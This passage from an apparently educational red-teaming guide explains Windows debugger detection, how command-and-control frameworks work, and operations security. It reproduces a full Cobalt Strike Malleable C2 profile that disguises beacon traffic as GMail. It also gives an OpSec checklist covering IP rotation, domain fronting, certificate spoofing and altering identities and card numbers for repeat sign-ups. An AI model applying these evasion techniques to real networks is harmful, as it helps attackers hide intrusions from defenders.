<pre><code class="language-C">struct _PEB{
  UCHAR InheritedAddressSpace;
  UCHAR ReadImageFileExecOptions;
  UCHAR BeingDebugged;
  [...trunc...]
};
</code></pre>
<ul>
<li>
<p>The flag is specifically designed to detect user-mode debuggers. When a debugger is used to attach to an active process:</p>
<ol>
<li>The debugger calls the Win32 API <code>DebugActiveProcess</code></li>
<li><code>DebugActiveProcess</code> triggers a call to <code>NtDebugActiveProcess</code> in the kernel.</li>
<li>The kernel involves an internal function, typically <code>DbgkpSetProcessDebugObject</code>, which assigns a debug object to the process.</li>
<li>The kernel updates the <code>BeingDebugged</code> attribute in the <code>PEB</code>, setting it to <code>TRUE</code> so that any further calls to <code>IsDebuggerPresent</code> will indicate that there is an active debugging session.</li>
</ol>
</li>
<li>
<p>When a debugger is used to launch a new process:</p>
<ol>
<li>The debugger calls the <code>CreateProcess</code> API (or <code>CreateProcessAsUser</code>\<code>WithToken</code>) with the <code>dwCreationFlags</code> parameter set to <code>DEBUG_PROCESS</code> or <code>DEBUG_ONLY_THIS_PROCESS</code>.</li>
<li>Whichever API call is used eventually causes the <strong>Process Manager</strong> (PS Subsystem) to call <code>PspAllocateProcess</code>, which is responsible for creating and initializing a new process object, <code>_EPROCESS</code> during process creation and recognizes that the debug flag has been set. Successively, Windows Executive components (i.e., <code>The Object Manager</code> and <code>The Process Manager</code>) become responsible for creating a <strong>Debug Object</strong> and setting the <code>DebugPort</code> attribute of the <code>_EPROCESS</code> object to point to said Debug Object.</li>
</ol>
<div id="admonition-note" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-title">
<div class="admonition-title">
<div id="admonition-note-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Evasion.html#admonition-note"></a>
</div>
<div>
<p>The <strong>Debug Object</strong> is a communication channel used by the debugger and the kernel to manage the creation and execution of debug events. When something important happens inside of a debugged process, such as process/thread creation, DLL loading/unloading, breakpoints, exceptions, etc., a debug event is created and stored in the <code>EventList</code> of the <code>_DEBUG_OBJECT</code>, then the</p>
<pre><code class="language-C">typedef struct _DEBUG_OBJECT
{
    KEVENT Event;                // 0x00  (0x18 bytes)
    FAST_MUTEX Mutex;           // 0x18  (0x28 bytes)
    LIST_ENTRY MessageList;     // 0x38  Debug events queue
    LARGE_INTEGER CreateTime;   // 0x48
    LIST_ENTRY ProcessList;     // 0x50  Attached processes
    union
    {
        ULONG Flags;            // 0x60
        ULONG RefCount;
    };
    ULONG Padding;              // 0x64
    // Possibly more WER/telemetry fields after
} DEBUG_OBJECT, *PDEBUG_OBJECT;
</code></pre>
<blockquote>
<p>Manually discerned using WinDbg. Look at <a href="./Reversing.html">Appendix X: Reversing the _DEBUG_OBJECT with WinDBG</a> for more details.</p>
</blockquote>
</div>
</div>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-to-c2-frameworks-and-operations-security"><a class="header" href="#introduction-to-c2-frameworks-and-operations-security">Introduction to C2 Frameworks and Operations Security</a></h1>
<p>Established Red Teams typically have documented procedures, toolsets, and frameworks to run repeatable engagements. <strong>Command &amp; Control</strong> Frameworks provide centralized orchestration. Operation leaders can assign roles, distribute tasks and resources, collect telemetry, and enforce OPSEC and governance controls across the team. In this section, we will review the general structure of C2 Frameworks and establish the foundational properties of operational security in red teaming engagements.</p>
<h2 id="command-and-control-frameworks"><a class="header" href="#command-and-control-frameworks">Command and Control Frameworks</a></h2>
<p>A <strong>Command and Control</strong> (C2) Framework is a tool that allows red teams and threat actors to communicate with and control compromised systems. They are used to send commands to target systems, receive data from these systems, and manage the system's operations. They provide a stealthy communication channel between an infected host and the attackers server. C2 Frameworks use a client-server model, where the attacker controls a control server to manage multiple infected systems. Once malware infects a device, it connects back to the C2 server, awaiting commands. The attacker can remotely send instructions to the infected system and by using multiple C2 frameworks, attackers can improve their chances of avoiding detection, allowing them to evaluate the security defenses of a target more thoroughly. Ultimately, they are designed to give operators the ability to perform post-exploitation tasks, maintain persistence, and collaborate with other operators to achieve their goals. They typically support external post-exploitation hacking tools as well, and have the ability to hide these tools in the memory of the targeted system. This means that they can be customized for the specific needs of a team/engagement.</p>
<p>C2 Frameworks can generally be divided into 3 parts:</p>
<ul>
<li><strong>C2 Server</strong>: The Command Center</li>
<li><strong>C2 Client</strong>: The Interface used by the Attacker</li>
<li><strong>C2 Agent</strong>: The Software Installed on the Compromised System to Facilitate Communication</li>
</ul>
<h3 id="c2-servers"><a class="header" href="#c2-servers">C2 Servers</a></h3>
<p>A <strong>C2 Server</strong> is the centralized hub where the attacker orchestrates their operation from. It is used for many purposes, from issuing commands for tasks like data theft, lateral movement, or deploying additional malware; to managing the connections to compromised systems. Attackers connect to it from their <strong>C2 Client</strong>, and ultimately it is responsible for facilitating the activities the attacker deems neccesary to complete their objective. C2 servers an be hosted in a few different ways:</p>
<ul>
<li><strong>Dedicated Infrastructure</strong>: Self-hosted servers or virtual-private servers (VPS).</li>
<li><strong>Cloud Server</strong>: Platforms like AWS or Azure are often used because they can blend in with normal traffic.</li>
<li><strong>Compromised Servers</strong>: Sometimes attackers hijack someone else's infrastructure to avoid being traced.</li>
</ul>
<p>Choose the option that meets the requirements of your engagement the best. At the end of the day, the C2 Server is important because it is a continuously running program that connects the various parts of the C2 Framework together. It plays an important role in monitoring the health of C2 Agents, providing resources and executing on commands for operators, and providing administrators with the tools needed to enforce policies and procedures. Good C2 Frameworks also keep logs of all activities, making it easy to audit engagements and write reports when they are complete.</p>
<p><img src="img/c2_server.png" alt="image" /></p>
<blockquote>
<p>The <strong>HAVOC</strong> C2 Teamserver Console</p>
</blockquote>
<p>Importantly, C2 Servers create <strong>listeners</strong>. These are network endpoints/services that wait for incoming connections from agents. They operate over various network protocols (i.e., <code>SMB</code>, <code>TCP</code>, <code>HTTP</code>, <code>DNS</code> etc.), and define how agents communicate with the C2 infrastructure and act as the entry point for establishing and maintaining C2 communication. They are responsible for:</p>
<ul>
<li>Receiving callbacks from agents</li>
<li>Negotiating communication parameters</li>
<li>Delivering payloads and tasks</li>
<li>Maintaining active sessions</li>
</ul>
<p>Typically, operators use the <strong>C2 Client</strong> to configure a listener, then the C2 Server stores and manages it. They are fundamental components of the C2 Infrastructure, as they act as the bridge between compromised endpoints and the rest of the attacker's control infrastructure. Without them, agents would have no method or location (IP Address, Port Number, Network Protocol, and Authentication Settings) to contact the C2 server.</p>
<h3 id="c2-clients"><a class="header" href="#c2-clients">C2 Clients</a></h3>
<p>The <strong>C2 Client</strong> is the interface where the attacker manages their operation. It provides a number of functions for the attacker, allowing them to:</p>
<ul>
<li><strong>Issue Commands</strong>: Tell the infected systems to collect files, execute tasks, or spread malware.</li>
<li><strong>Automate Tasks</strong>: Save time on repetitive ativities.</li>
<li><strong>Monitoor in Real TIme</strong>: Live updates on what is happening across compromised systems.</li>
<li><strong>Customize Attacks</strong>: Write scripts or add plugins to adapt to specific targets.</li>
</ul>
<p>Where the C2 Server is the engine that facilitates operations, the C2 Client is the dashboard that shares information with the operators about the state of the engagement, allows operators to configure payloads for target systems, and send commands to the C2 server to be executed on target systems. Essentially, the C2 Client is the console where each operator observes the state of the engagement and initiates their own contributions.</p>
<p><img src="img/c2_client.png" alt="image" /></p>
<blockquote>
<p>The <strong>HAVOC</strong> C2 Client</p>
</blockquote>
<h3 id="c2-agents"><a class="header" href="#c2-agents">C2 Agents</a></h3>
<p><strong>C2 Agents</strong> are small pieces of software installed on compromised systems that connect the infected device back to the C2 Server and carries out the attacker's commands. Once a system is infected, the agent calls back to the C2 server. This can happen through encrypted web traffic (i.e. <code>HTTPS</code>), DNS Tunneling, or other covert channels. The agent waits for instructions and then executes commands. They are designed to be stealthy. Often, they mimic legitimate processes (i.e., <code>svchost.exe</code>) or use fileless malware techniques to stay under the radar. Sometimes, they are referred to as <code>C2 Implants</code> or <code>bots</code> depending on the C2 framework you are using.</p>
<p><img src="img/c2_agent.png" alt="image" /></p>
<blockquote>
<p>The <strong>HAVOC</strong> <code>demon.x64.exe</code> C2 Agent Executing On a Target System</p>
</blockquote>
<h3 id="types-of-c2-frameworks"><a class="header" href="#types-of-c2-frameworks">Types of C2 Frameworks</a></h3>
<p>When it boils down to it, attackers use two types of C2 Framework: <strong>Custom-Built</strong> and <strong>Off-the-Shelf</strong>. Some examples of Custom-Built frameworks include:</p>
<ul>
<li><strong><a href="https://attack.mitre.org/software/S0054/">CloudDuke</a></strong> from <strong><a href="https://attack.mitre.org/groups/G0016/">APT29</a></strong></li>
<li><strong><a href="https://attack.mitre.org/software/S0502/">Drovorub</a></strong> from <strong><a href="https://attack.mitre.org/groups/G0007/">APT28</a></strong></li>
<li><strong><a href="https://attack.mitre.org/software/S1051/">Keyplug</a></strong> from <strong><a href="https://attack.mitre.org/software/S1051/">APT41</a></strong></li>
</ul>
<p>These are custom software designed by the attacker to manage a certain engagement or type of attack. Some examples of Off-the-Shelf frameworks include:</p>
<ul>
<li><a href="https://www.cobaltstrike.com">Cobalt Strike</a></li>
<li><a href="https://www.metasploit.com">Metasploit</a></li>
<li><a href="https://havocframework.com">Havoc</a></li>
<li><a href="https://bc-security.gitbook.io/empire-wiki">Empire</a></li>
<li><a href="https://sliver.sh">Sliver</a></li>
</ul>
<p>These are a mix of commercial and open-source products designed for right out of the box use by researchers, testers, and operators. Since they are publicly available, their default configurations likely produce known malicious signatures that security monitoring systems will be alerted to, so it is always important to know the tools you are using and how they will appear to the tools you are using.</p>
<div id="admonition-note" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-title">
<div class="admonition-title">
<div id="admonition-note-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Command.html#admonition-note"></a>
</div>
<div>
<p><strong>OPSEC</strong> Considerations:</p>
<p>Any good C2 Framework for Red Teaming will have an intuitive user interface, advanced automation capabilities, advanced encryption and authentication features, and extensive 3rd party integrations. But using a good product right out of the box is never enough to be truly stealthy during an engagement. When using C2 Frameworks, it is important to:</p>
<ul>
<li><strong>Disguise Communications</strong>: Make your traffic look normal. Since organizations rely on standard protocols like HTTP/HTTPS, DNS, and SMTP, blocking or flagging suspicious traffic risks disrupting legitimate operations.</li>
<li><strong>Obfuscate Activities</strong>: Use obfuscation techniques to cover your tracks. Some examples include:
<ul>
<li><strong>Domain Fronting</strong>: A technique where you route traffic through well-known services like content-delivery networks</li>
<li><strong>Impersonating legitimate protocols</strong></li>
<li><strong>Deploying polymorphic malware that constantly changes form</strong>
These techniques hinder signature-based detection tools, as they cannot keep up with constantly shifting patterns.</li>
</ul>
</li>
<li><strong>Mask Network Activity</strong>: Utilize redirectors or multi-stage C2 servers to act as a go-between, funneling traffic from compromised systems to the actual C2 server. This masks the origin of traffic, making it difficult to track the location of the attacker.</li>
</ul>
<p>This last point about redirectors is particularly important. Modern Red Teams rarely connect agents against their primary C2 Server (the <strong>Teamserver</strong>). Instead, they seperate the long-term control server from the agents with short-term, disposable ingress points. This is essentially wht <strong>redirectors</strong> are. They mask the true IP address of the C2 server, ensuring that if the blue team disovers and blocks the discovered IP, only the redirector is burned, and the core infrastructure remains healthy and undisturbed. There are essentially two types of redirector:</p>
<ul>
<li><strong>Dumb Redirectors</strong>: Simply forward all traffic on a specific port to the C2 Server using a service like <code>iptables</code> or <code>socat</code>.</li>
<li><strong>Smart Redirectors</strong>: Use web servers (i.e., <code>Apache</code> or <code>Nginx</code>) to process incoming HTTP/S traffic so that only verified, filtered traffic can make it back to the C2 server.</li>
</ul>
<p>We will review Red Team OPSEC in more detail later in this chapter.</p>
</div>
</div>
<h2 id="c2-frameworks-in-action"><a class="header" href="#c2-frameworks-in-action">C2 Frameworks in Action</a></h2>
<p>Agents are frequently deployed via <strong>payloads</strong>, specialized code segments engineered for particular actions on the target, such as establishing remote shells, installing backdoors, harvesting credentials, or deploying additional malicious modules. Payloads can be staged or stageless. A <strong>staged</strong> payload is broken up into parts: the <strong>stager</strong> and the <strong>stages</strong>. The <strong>stager</strong> is a small, first-stage payload used to establish initial access to a target system, then retrieve the next component of the payload. <strong>Stages</strong> comprise additional components of the payload that serve different purposes. For instance, a <strong>dropper</strong> is a payload component that installs some other, malicious program onto the system (such as a virus, ransomware, a backdoor, etc.). Additional components may either be packaged with the dropper or installed over the internet. <strong>Loaders</strong> place a malicious payload component into memory so that it may be executed. Typically they are used to evade disk-based detection mechanisms, as executable components are either decrypted or installed directly into memory, without ever touching the hard drive. Other staged components can be used to accomplish specific tasks, such as <strong>injectors</strong>, <strong>decryptors</strong>, and <strong>environment checkers</strong>, but ultimately each stage is geared toward installing the agent on the target system to establish a communication channel with the C2 Server. <strong>Stageless</strong> payloads contain everything they need to run the agent in a single delivery. No additional downloads are required after for execution.</p>
<p>Once an agent is installed and executed on the target system, it sends a <strong>callback</strong> to the C2 Server, creating a session identifier and establishing trust between the server and the agent. After sending the initial callback, most agents will switch to <strong>beaconing</strong> mode. Essentially, a <strong>beacon</strong> is a periodic outbound message sent by the agent to the C2 server, that typically signals that the agent is alive, requests new <strong>tasking</strong>, and sends queued results/metadata back to the C2 server.</p>
<blockquote>
<p><strong>Tasking</strong> describes the mechanism by which a C2 server issues instructions to an agent, and the agent executes those instructions and returns the results. In many frameworks, a <strong>task</strong> is the instruction itself, whereas a <strong>job</strong> is the execution instance of that task on the agent.
A <strong>heartbeat</strong> is a specialized form of beacon, which simply confirms that the agent is still running on the target. It contains minimal or no data, and is often used when no tasks are queued. In many frameworks, every beacon implicitly acts as a heartbeat. Heartbeats help operators distinguish between dormant but healthy agents and disconnected or terminated agents.</p>
</blockquote>
<p><strong>Jitter</strong> introduces random variation into beacon or heartbeat timing. Instead of beaconing over an exact interval (i.e., every <code>60</code> seconds), jitter modifies the delay so that it is more random (i.e., <code>60</code> seconds ± <code>20%</code>). Jitter is important because fixed intervals are very easy to detect. Jitter makes traffic appear more human or application-like, making C2 operations more difficult to detect.</p>
<p>Advanced frameworks (like <strong>Cobalt Strike</strong>) implement <strong>Malleable Profiles</strong>, which allow operators to customimze how the C2 traffic appears on the network, granting them the ability to make it appear more like normal network traffic and evade detection. These are small programs that define provide a template describing C2 beacon should look. For instance, here is an example of a Malleable C2 Profile designed to disguise beacon traffic as <code>GMail</code> traffic on a network. It was published by <strong>BC-Security</strong>, a group of cybersecurity engineers and offensive security enthusiasts that actively maintain and update Powershell Empire in their spare time ;-). Credit to <code>@ChrisTruncer</code> for authoring this profile:</p>
<pre><code># Make requests look like GMail web requests
#
# Author: @ChrisTruncer

https-certificate {
	set CN       "gmail.com";
	set O        "Google GMail";
	set C        "US";
	set L        "Mountain View";
	set OU       "Google Mail";
	set ST       "CA";
	set validity "365";
}

set sleeptime "60000";
set pipename "interprocess_##";
set spawnto "userinit.exe";
set jitter "15";
set dns_idle "8.8.4.4";

http-get {
	set uri "/_/scs/mail-static/_/js/";
	client {

		metadata {
			base64;
			prepend "OSID=";
			header "Cookie";
		}

		header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
		header "DNT" "1";
	}

	server {
		header "X-Content-Type-Options" "nosniff";
		header "X-Frame-Options" "SAMEORIGIN";
		header "Cache-Control" "public, max-age=31536000";
		header "X-XSS-Protection" "1; mode=block";
		header "Server" "GSE";
		header "Alternate-Protocol" "443:quic,p=1";

		output{
			prepend "try(";
			prepend "O(L.Oa(),\"sy580\")";
			prepend "N(L.Oa(),\"sy580\");P(L.Oa(),\"sy580\");";
			prepend ")catch(e)(_DumpException(e))";
			prepend "try(";
			prepend "O(L.Oa(),\"sy558\");";
			prepend "N(L.Oa(),\"sy558\");P(L.Oa(),\"sy558\");";
			prepend ")catch(e)(_DumpException(e))";
			prepend "try(";

			append "var f2=function(a)(a=a.wa;return\"application/chromium-bookmark-folder\"==a||\"application/chromium-root-folder\"==a||\"application/vnd.google-apps.folder\"==a||\"application/vnd.google-apps.photoalbum\"==a||\"application/vnd.google-apps.rollupphotoalbum\"==a)";
			append ",g2=function(a)(return a.ra),s8d=function(a)(return a?hb(a,function(a)(return new UP(a)):[]),h2=function(a)(switch(a)(case \"all\":case \"docs-images\":case \"docs-images-and-videos\":case \"docs-videos\":case \"documents\":case \"drawings\":case \"folders\":case \"forms\":case \"pdfs\":case \"presentations\":case \"sites\":case \"spreadsheets\":case \"tables\":return!0)return!1); O(L.Oa(),\"sy588\")";

			print;

		}
	}
}

http-post {
	set uri "/mail/u/0/";
	client {
		parameter "ui" "d3244c4707";
		parameter "hop" "6928632";
		parameter "start" "0";
		header "Content-Type" "application/x-www-form-urlencoded;charset=utf-8";

		id {
			base64;
			prepend "OSID=";
			header "Cookie";
        }

		output{
			base64;
			print;
		}
	}

	server {
		header "X-Content-Type-Options" "nosniff";
		header "X-Frame-Options" "SAMEORIGIN";
		header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
		header "X-XSS-Protection" "1; mode=block";
		header "Server" "GSE";

		output {

			prepend "[[[\"apm\",\"";

			append "\"]";
			append ",[\"ci\",[]";
			append "]";
			append ",[\"cm\",[]";
			append ",[]";
			append "]";
			append "],'dbb8796a80d45e1f']";

			print;
		}

	}
}
</code></pre>
<blockquote>
<p>Source: <a href="https://github.com/BC-SECURITY/Malleable-C2-Profiles/blob/master/Normal/reddit.profile">BC-Security GitHub</a></p>
</blockquote>
<!--
Breakdown how what this Malleable Profile is doing
Show how Malleable Profile traffic appears on the network using Wireshark
-->
<p>A description of the syntax of the Malleable C2 Profile language can be found <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm?__hstc=173638140.5572de669d16511e7a7369de9b5a24a7.1769794321624.1769794321624.1769797138410.2&amp;__hssc=173638140.2.1769797138410&amp;__hsfp=d4fbe0704d25aa0908150659cafc510a&amp;_gl=1*1s3xxag*_gcl_au*NjI1OTE0NjQ1LjE3Njk3OTQzMTU.*_ga*MTA0ODgwNTE1OC4xNzY5Nzk0MzE3*_ga_HNS2ZVG55R*czE3Njk3OTcxMzMkbzIkZzEkdDE3Njk3OTcxNTEkajQyJGwwJGgw#_Toc65482837">here</a>.</p>
<p>C2 Frameworks are important because they offer a continuous, secure, and manageable connection between the attacker and their targeted systems. We will review this subject in more technical depth in the chapters that follow.</p>
<h2 id="operations-security"><a class="header" href="#operations-security">Operations Security</a></h2>
<p><strong>Operations Security</strong> (OpSec) is a process that identifies critical information to determine if friently actions can be observed by enemy intelligence, determines if information obtained by adversaries could be interpreted to be useful to them, and executes selected measures that eliminate or reduce adversary exploitation of friendly critical information. It is a term derived from the United States Military, stemming back to the Vietnam War Operation, Codename:<strong><a href="https://www.nsa.gov/portals/75/documents/news-features/declassified-documents/cryptologic-histories/purple_dragon.pdf">Purple Dragon</a></strong>, that was later adopted by the intelligence and security communities. As it relates to red teams, they do not want the blue team to "connect the dots". Each time the red team interacts with their target organization, it leaves behind a "dot". With enough dots, the blue team can identify red team tools and infrastrucutre, then prevent or mitigate attacks after they are fully realized. This can be especially frustrating if the blue team connects the dots before the red team knows it. The red team can keep the blue team from connecting the dots by either not leaving any, or only leaving dots that are not associated with one another.</p>
<div id="admonition-basic-red-team-opsec-checklist" class="admonition admonish-warning" role="note" aria-labelledby="admonition-basic-red-team-opsec-checklist-title">
<div class="admonition-title">
<div id="admonition-basic-red-team-opsec-checklist-title">
<p>Basic Red Team OpSec Checklist</p>
</div>
<a class="admonition-anchor-link" href="Command.html#admonition-basic-red-team-opsec-checklist"></a>
</div>
<div>
<p>As an attacker, <strong>be wary of revealing the following information</strong> during an attack:</p>
<ul>
<li>Hostname</li>
<li>Domain Name
<ul>
<li>Avoid typosquating the target domain</li>
<li>Use WHOIS privacy</li>
<li>Use one domain for every red team act</li>
</ul>
</li>
<li>Browser User-Agent</li>
<li>Access to payload URLs and Landing Pages</li>
<li>Source IP Addresses
<ul>
<li>Never use the same IP address for two activities that you don't want assocaited with each other</li>
<li>IP addresses should make sense relative to your actions from the IP</li>
<li>When logging into user accounts:
<ul>
<li>Use one IP address per user account and keep using the same IP for all subsequent logins</li>
<li>Login from an IP address in the same region as the user</li>
<li>Login from a service provider that makes sense for the target user.</li>
<li>Avoid known-suspicious IPs: TOR, Proxies, etc.</li>
</ul>
</li>
<li>Get new source IP addresses from:
<ul>
<li>Residential IP address Providers:
<ul>
<li>Luminati (Now Bright Data)</li>
<li>Smartproxy</li>
</ul>
</li>
<li>IP Address Rotation Services:
<ul>
<li>GeoSurf</li>
<li>Oxylabs</li>
</ul>
</li>
<li>Mobile hotspots</li>
<li>Wifi hotspots</li>
<li>VPNs (free or paid)</li>
<li>Cloud Service Providers</li>
<li>TOR (when required)</li>
</ul>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>Inspect each source IP for "tells" and build your own vetted list</p>
</blockquote>
<ul>
<li>Third-party services
<ul>
<li>Assess whether red team actions are likely to violate TOS
<ul>
<li>Modify identity (name, email, billing address, phone), credit card numbers, and source IP for repeat sign-ups</li>
</ul>
</li>
<li>Assess whether your registration information is likely to be exposed</li>
<li>Assess whether use of the same account across multiple projects is likely to leak information about the red team or its customers
<ul>
<li>Can the resource owner be identified by outsiders?</li>
<li>Can relationships between multiple resources be assocaited with each other?</li>
<li>Is there a reasonable level of trust with the resource provider?</li>
</ul>
</li>
<li><strong>SSL/TLS</strong> certificates and CAs
<ul>
<li>Watch out for data leaks in certificate transparency logs
<ul>
<li>Customer names</li>
<li>Email Addresses</li>
<li>Phone Numbers</li>
</ul>
</li>
<li>No default or self-signed certificates. Both can easily be flagged or blocked by Censys.io search</li>
<li><strong>Let's Encrypt</strong> certificates may be suspicious, as they are the default CA in lots of hacking tutorials, though they are used by legitimate services as well.</li>
</ul>
<blockquote>
<p><strong>Let's Encrypt Certificates</strong>: Digital certificates provided by the non-profit Certificate Authority (CA) <strong>Let's Encrypt</strong>, who offer SSL/TLS certificates at no cost, making secure connections accessible to a wider range of users and organizations. These certificates have a validity period of 90 days.</p>
</blockquote>
</li>
<li>Network Services
<ul>
<li>Don't expose services to the internet that aren't required
<ul>
<li>Use SSH port forwarding for acceess from the red team</li>
</ul>
</li>
<li>Change all default settings on hacking tools that listen on an Internet-facing port</li>
<li>Use redirectors liberally and spread them across multiple CSPs</li>
<li>Use Common web services (Apache, Nginx) to redirect HTTP/S traffic to servers run by hacking tools</li>
</ul>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>Know the tools that you are using</p>
<ul>
<li>Confirm that the <strong>tool isn't harming you</strong></li>
<li>Confirm that <strong>how the tool/attack looks</strong> from the defenders perspective <strong>isn't suspicious</strong></li>
<li>Confirm that the <strong>attack looks believable</strong> from the perspective of the target user.</li>
</ul>
</blockquote>
</div>
</div>
<p>Ultimately, the goal with OpSec is to reduce mission compromise by identifying and elminimating unintentional data leaks through behavior, communications, or logistics. Many red teams fail to maintain strict OpSec because of reliance on pre-configured tools, careless infrastructure setups, or insufficient separation of operational identities. Some consequences include:</p>
<ul>
<li>Burned C2 Infrastruture (IP/Domain Blacklisting)</li>
<li>Attribution of activity to consulting firms or internal threat emulation teams</li>
<li>Legal complications in regulated industries if internal users are affected</li>
</ul>
<p>Some notable cases include:</p>
<ul>
<li>APT28 (FancyBear): In late May of 2018, the U.S. Department of Justice announced the high-profile disruption of APT28's VPNFilter Infrastructure. This was due to:
<ul>
<li>Shared Registrant and Certificate Metadata</li>
<li>Reuse of Hosting Providers</li>
<li>Public Access to C2 Domain Infrastructure through DNS</li>
<li>Poorly Routed Malware Callbacks</li>
</ul>
</li>
<li>Public reports (i.e., <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-326a?utm_source=chatgpt.com">CISA</a>, <a href="https://networkdigitalsecurity.com/case-studies/case-study-red-team-engagement-for-a-government-facility/?utm_source=chatgpt.com">NDS, Inc.</a>) show clients identifying Red Team prematurely due to:
<ul>
<li>Reused Beacon Patterns</li>
<li>Leaked Usernames</li>
<li>C2 Reuse</li>
<li>Suspicious Protocol Use (i.e., constant packet length, Base64 blobs in parameters)</li>
</ul>
</li>
</ul>
<p>Red Teams must treat every engagement as a live adversarial environment. Even if the target is known to be passive or "simulated", every artifact left behind is subject to future review, correlation, or forensic discovery.</p>
<h2 id="the-five-step-opsec-process"><a class="header" href="#the-five-step-opsec-process">The Five-Step OpSec Process</a></h2>
<p>The formal OpSec process, standardized by the <a href="https://media.defense.gov/2020/Oct/28/2002524943/-1/-1/0/NTTP-3-13.3M-MCTP-3-32B-OPSEC-2017.PDF?utm_source=chatgpt.com">U.S. Department of Defense</a> consists of five iterative steps. While originally developed for military use, the same structure appleis to offensive cyber operations. Understanding an applying this process reduces the risk of operational exposure due to leaks in infrastructure, behavior, or tooling.</p>
<h3 id="step-1-identify-critical-information"><a class="header" href="#step-1-identify-critical-information">Step 1: Identify Critical Information</a></h3>
<p>Identify what must be protected. In the context of Red Teaming, critical information includes:</p>
<ul>
<li>IP Address ranges of infrastructure (C2, redirectors, stagers)</li>
<li>Beaconing patterns, headers, or payload signatures</li>
<li>Operator metadata (usernames, email headers, browser fingerprints)</li>
<li>Domain registration data</li>
<li>TTPs that can be fingerprinted</li>
</ul>
<p>Focus on what could provide adversaries with actionable intelligence if discovered. Document all operational assets, personas, and artifacts before deployment. Treat metadata as data.</p>
<h3 id="step-2-analyze-threats"><a class="header" href="#step-2-analyze-threats">Step 2: Analyze Threats</a></h3>
<p>Assess who might be observing or analyzing your activity and what their capabilities are. The interesting thing here is that you need to take advantage of any vulnerabilities in their Operations Security. Red Team operators should map the detection surface against potential observers, being:</p>
<ul>
<li>Internal Blue Team with Behavioral Detection</li>
<li>SIEMs Aggregating Logs Across Endpoints and Networks</li>
<li>Threat Intelligence Platforms Correlating Passive DNS, TLS Certificates or ASN data</li>
<li>External Scanners like Shodan, Censys, and Zoomeye</li>
</ul>
<p>Also, consider that threats may not always be your target. Aside from external TI platforms and external scanners, consider that:</p>
<ul>
<li>A unauthorized person trying to obtain mission critical information</li>
<li>A person who intentionally or unintentionally supplies mission critical information to an adversary</li>
<li>A public post detailing mission critical information</li>
<li>A person who shoulder-surfs
should all be considered threats as well. Question who has visibility into your infrastructure. Can DNS or IP behavior trigger alerts and do reused payloads match known malware signatures?</li>
</ul>
<h3 id="step-3-vulnerability-analysis"><a class="header" href="#step-3-vulnerability-analysis">Step 3: Vulnerability Analysis</a></h3>
<p>After identifying critical data and adversaries, analyze how this information could leak. This often includes:</p>
<ul>
<li>Misconfigured DNS (i.e., wildcard records exposing all subdomains)</li>
<li>Use of commercial VPN IPs instead of private infrastructure</li>
<li>DNS resolutions during payload testing (sandbox leaks)</li>
<li>Unencrypted communication during staging</li>
<li>Beacon jitter or frequency that follow default settings</li>
</ul>
<p>Audit your tools, infrastructure, and operator habits. Be able to answer the following question:</p>
<ol>
<li>What critical information indicators (friendly actions and open-source intelligence) will the planned operation generate through friendly activities?</li>
<li>What indicators can the target actually observe/collect?</li>
<li>What indicators can the target use to the disadvantage of friendly forces?</li>
</ol>
<p>Base on your answer to these questions, rank the criticality of each identified vulnerability.</p>
<h3 id="step-4-risk-assessment"><a class="header" href="#step-4-risk-assessment">Step 4: Risk Assessment</a></h3>
<p>Risk assessments estimate an adversary's capability to exploit a vulnerability and the potential effects such exploitation has on operations. During this step, you need to calculate the likelihood and impact of each identified vulnerability. Consider:</p>
<ul>
<li>What is the likelihood that the Blue Team detects our domain/IP via passive monitoring?</li>
<li>What is the impact if our infrastructure is blacklisted mid-engagement?</li>
<li>How easily can our TTPs be attributed to a known framework?</li>
</ul>
<p>Performing thorough risk assessments help red teams avoid unnecessary risks and accept necessary risks when the cost of mitigation outweights the benefit. Understand your security posture before you take any potentially alertable actions. For instance, using a default Cobalt Strike malleable profile or reusing open-source implants increases detection probability due to signature matching, therefore you should modify the configuration of your tools before using them to avoid quick and easy detection.</p>
<h3 id="step-5-apply-countermeasures"><a class="header" href="#step-5-apply-countermeasures">Step 5: Apply Countermeasures</a></h3>
<p>Applying OpSec principles and using countermeasures preserves the operation by preventing the target from discovering you or completely removing you from their systems after discovery. Once vulnerabilities are prioritized, apply technical and procedural controls. Counter measures may include:</p>
<ul>
<li>CDN Masking</li>
<li>IP Rotation</li>
<li>Use of custom payloads with obfuscated indicators</li>
<li>Payload testing in sandboxed environments</li>
<li>TLS certificate spoofing</li>
<li>Isolated, single-use domains and redirectors</li>
<li>Domain Fronting</li>
</ul>
<p>Countermeasures should be measurable for performance and effectiveness. It is best practice to automate infrastructure deployment usinc Infrastructure as Code (IaC) templates with OpSec constrains built-in.</p>
<h2 id="using-opsec-with-c2-frameworks"><a class="header" href="#using-opsec-with-c2-frameworks">Using OpSec with C2 Frameworks</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="appendix-x-reversing-the-_debug_object-with-windbg"><a class="header" href="#appendix-x-reversing-the-_debug_object-with-windbg">Appendix X: Reversing the <code>_DEBUG_OBJECT</code> with WinDBG</a></h1>
<h2 id="introduction-2"><a class="header" href="#introduction-2">Introduction</a></h2>
<p>The <code>_DEBUG_OBJECT</code> is a kernel object that represents a debugging session between a debugger and one or more "debuggee" processes. It is used to track which processes are being debugger, queue debug events (i.e., breakpoints, exceptions, thread creation, module loads, etc.), and act as a communication bridge between the debugger and the target process.</p>
<div id="admonition-note" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-title">
<div class="admonition-title">
<div id="admonition-note-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Reversing.html#admonition-note"></a>
</div>
<div>
<p>Windows developers use two main functions to interact with <code>_DEBUG_OBJECT</code> objects:</p>
<ul>
<li>
<p><code>NtCreateDebugObject</code>: A low-level Native API that the Windows kernel uses to instantiate a new Debug Object in kernel memory.</p>
